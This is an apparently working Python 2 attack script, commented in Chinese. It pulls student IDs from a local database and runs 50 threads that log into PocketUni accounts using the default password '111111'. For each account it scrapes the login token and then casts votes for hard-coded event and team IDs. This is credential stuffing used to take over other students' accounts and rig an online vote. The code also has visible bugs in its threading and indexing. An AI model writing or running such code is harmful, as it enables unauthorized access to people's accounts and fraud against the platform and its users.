#!/usr/bin/python
# coding=utf-8
import urllib2
import urllib
import cookielib
import re
import MySQLdb
import threading
import thread

#互斥锁
mylock = thread.allocate_lock()

class PU(threading.Thread):
    index = 0
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        i = 0
        while True:
            if mylock.acquire():
                i = self.index
                self.index = self.index + 1 
                mylock.release()
            if(self.login(stu_list[self.index][0], '111111')):
                pass
                print "Yes"
            else:
                print "NO"
    def login(stuid,pas): 
        print stuid
        req_url = "http://www.pocketuni.net/"
        request_url = "http://pocketuni.net/index.php?app=home&mod=Public&act=doLogin"
        #school = ""
        school = "******" #学校中文名
        #构造头部
        headers = {
            "Host": "pocketuni.net",
            "Referer":"http://www.pocketuni.net/",
            "DNT" : "1",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        #处理Cookie
        CookieJar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(CookieJar))
        try:
            res = opener.open(req_url)
        except Exception:
            return 1
        #用opener打开页面获取登陆时要post的数据中__hash__一项的值
        p = re.compile("<input type=\"hidden\" name=\"__hash__\" value=\"[^\"]*")
        txt = res.read()
        p = p.findall(txt)
        try:
            p = str(p[0])
            s = p.split('value=\"')
            _hash_ = s[1]
        except Exception:
            return 1
        #print _hash_
        #构造post数据
        data = {
            "school": school,
            "sid": "",#学校id
            "number": stuid,
            "password": pas,
            "login": "登 录",
            "__hash__": _hash_
        }
        post_data = urllib.urlencode(data)
        #登陆
        req = urllib2.Request(request_url,post_data,headers)
        sch = 'njupt' #学校简写，例如njupt
        schurl = 'https://' + sch + '.pocketuni.net' #该校的url
        try:
            opener.open(req)
            res = opener.open(schurl)
        except Exception:
            return 1
        txt = res.read()
        #如果打开该校的pu url有登陆按钮，则表示并未成功登陆，获得失败
        failed = "clogin"
        if failed in txt:
            return 1
        #构造投票数据的头部
        toupiaopost_headers = {
            "Host" :schurl,#该校的url
            "DNT" : "1",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        req_url = 'http://' + sch + '.pocketuni.net/index.php?app=event&mod=Front&act=vote'
        #根据猜测，id应为活动编号，pid因为参赛团队编号 
        toupiao_data = {
            "id" : "",
            "pid" : ""
        }
        try:
            #要投票的两个活动
            ids = ["85008","85031"]
            #要投票的五个团队
            pids = ["25139","25081","25145","25084","25465","25083","25445","25441","25433","25425"]
            #投票要post的数据
            for j in range(0,2):
                toupiao_data["id"] = ids[j]
                for i in range(0,6):
                    toupiao_data["pid"] = pids[j*5+i]
                    toupiaopostdata = urllib.urlencode(toupiao_data)
                    req1 = urllib2.Request(req_url,toupiaopostdata,toupiaopost_headers)
                    opener.open(req1)
                    #成功结束返回0，异常结束返回1
        except Exception:
            return 1
        return 0


conn = MySQLdb.connect(host="localhost", user="***", passwd="****", db="***", charset="utf8")
mycursor = conn.cursor()
mycursor.execute("select stu_id from info")
stu_list = mycursor.fetchall()
li = []
for i in range(0, 50):
    thread = PU()
    thread.start()
    li.append(thread)
